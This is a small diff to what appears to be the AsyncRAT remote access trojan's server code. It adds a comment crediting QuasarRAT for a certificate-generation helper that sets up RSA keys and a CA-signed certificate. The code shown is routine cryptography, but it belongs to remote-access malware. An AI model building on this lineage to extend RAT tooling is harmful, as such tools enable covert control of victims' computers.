@@ -45,6 +45,7 @@ namespace AsyncRAT_Sharp.Forms
 
         public static X509Certificate2 CreateCertificate(string certName, X509Certificate2 ca, int keyStrength)
         {
+            // github.com/quasar/QuasarRAT/blob/master/Quasar.Server/Helper/CertificateHelper.cs
             var caCert = DotNetUtilities.FromX509Certificate(ca);
             var random = new SecureRandom(new CryptoApiRandomGenerator());
             var keyPairGen = new RsaKeyPairGenerator();
